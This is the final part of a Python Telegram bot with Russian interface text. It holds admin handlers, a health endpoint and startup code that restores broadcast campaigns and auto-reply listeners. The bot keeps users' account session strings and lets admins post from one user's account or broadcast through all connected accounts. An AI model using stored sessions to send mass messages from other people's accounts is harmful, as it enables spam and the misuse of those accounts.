        await message.answer(f"❌ Не удалось добавить канал ({type(exc).__name__}). Проверьте ID/username и права администратора бота.")
    finally:
        await state.clear()

@dp.message(AdminFlow.admin_user_broadcast_id)
async def admin_user_broadcast_id(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        target = int((message.text or "").strip())
        user = await db.get_user(target)
        if not user or not user["session_string"]:
            await message.answer("Пользователь не найден в базе или его аккаунт не подключён.")
            await state.clear()
            return
        await state.update_data(target_id=target)
        await state.set_state(AdminFlow.admin_user_broadcast_text)
        await message.answer("Отправьте текст сообщения.")
    except ValueError:
        await message.answer("ID должен быть числом.")

@dp.message(AdminFlow.admin_user_broadcast_text)
async def admin_user_broadcast_text(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    data = await state.get_data()
    try:
        result = await sender.send_to_account(data["target_id"], (message.text or "").strip())
        report = f"Готово. Отправлено: {result['sent']}; ошибок: {result['failed']}."
        if result.get("errors"):
            report += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await message.answer(report)
        await db.log_admin_action(message.from_user.id, "user_broadcast", data["target_id"], result)
    except Exception as exc:
        await message.answer(f"Не удалось выполнить рассылку: {type(exc).__name__}: {exc}")
    await state.clear()

@dp.message(AdminFlow.global_broadcast_text)
async def admin_global_broadcast_text(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    await state.clear()
    await message.answer("Общая рассылка запущена; это может занять некоторое время.")
    results = await sender.broadcast_all((message.text or "").strip())
    await message.answer(f"Общая рассылка завершена. Обработано аккаунтов: {len(results)}.")

@dp.message(AdminFlow.refresh_user)
async def admin_refresh_user(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        user = await db.get_user(user_id)
        if not user:
            await message.answer("Пользователь отсутствует в базе данных.")
        else:
            await message.answer(
                f"ID: {user['user_id']}\nUsername: @{user['username'] or '—'}\nИмя: {user['full_name']}\nЗвёзды: {user['stars']}\nПодключён: {'да' if user['session_string'] else 'нет'}\nИнтервал: {user['delay_seconds']} сек.\nПодпись: {'включена' if user['signature_enabled'] else 'выключена'}"
            )
    except Exception as exc:
        await message.answer(f"Ошибка: {exc}")
    await state.clear()

@dp.message(AdminFlow.remove_admin)
async def admin_remove_admin(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        if is_super(user_id):
            await message.answer("Суперадминистратора нельзя удалить отсюда.")
        else:
            await db.remove_admin(user_id)
            await db.log_admin_action(message.from_user.id, "remove_admin", user_id)
            await message.answer(f"Админ {user_id} удалён.")
    except Exception as exc:
        await message.answer(f"Ошибка: {exc}")
    await state.clear()

@dp.message()
async def unknown_message(message: Message):
    if message.from_user:
        await message.answer("Выберите действие в меню или нажмите /start.")

async def health(request):
    return web.Response(text="JingizBot is alive", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.port)
    await site.start()
    log.info("Health server listening on port %s", config.port)
    return runner

async def main():
    await db.init_db(config.database_url)
    await bot.set_my_commands([
        BotCommand(command="start", description="Запустить бота"),
        BotCommand(command="menu", description="Открыть главное меню"),
        BotCommand(command="admin", description="Панель администратора"),
        BotCommand(command="users", description="Список пользователей (админ)"),
    ])
    # Super-admin IDs аз ENV ба admins низ ворид мешаванд, аммо иҷозаташон всегда аз ENV санҷида мешавад.
    async with db.get_pool().acquire() as con:
        for admin_id in config.super_admins:
            await con.execute("INSERT INTO admins(user_id, added_by) VALUES($1,$1) ON CONFLICT(user_id) DO NOTHING", admin_id)
    runner = await start_health_server()
    # Restore campaigns that were enabled before a Render restart/redeploy.
    try:
        active_campaigns = await db.get_active_auto_campaigns()
    except Exception:
        log.exception("Could not load persisted auto-broadcast campaigns")
        active_campaigns = []
    for campaign in active_campaigns:
        user_id = int(campaign["user_id"])
        if user_id in auto_tasks and not auto_tasks[user_id].done():
            continue
        auto_tasks[user_id] = asyncio.create_task(
            run_auto_campaign(user_id, str(campaign["message_text"]), int(campaign["notify_chat_id"]))
        )
        log.info("Restored auto-broadcast campaign for user %s", user_id)
    # Restore opted-in auto-reply listeners after Render restart.
    try:
        async with db.get_pool().acquire() as con:
            rows = await con.fetch("SELECT key FROM settings WHERE key LIKE 'autoreply_enabled:%' AND value='1'")
        for row in rows:
            try:
                user_id = int(str(row["key"]).split(":", 1)[1])
                await start_autoreply_listener(user_id)
            except Exception:
                log.exception("Could not restore autoreply listener for setting %s", row["key"])
    except Exception:
        log.exception("Could not restore autoreply listeners")
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        global shutting_down
        shutting_down = True
        for task in list(campaign_tasks.values()) + list(timer_tasks.values()) + list(auto_tasks.values()):
            task.cancel()
        for client in list(login_clients.values()):
            with suppress(Exception):
                await client.disconnect()
        for client in list(autoreply_clients.values()):
            with suppress(Exception):
                await client.disconnect()
        for task in list(autoreply_tasks.values()):
            task.cancel()
        await runner.cleanup()
        await bot.session.close()
        if db.pool:
            await db.pool.close()

if __name__ == "__main__":
    asyncio.run(main())
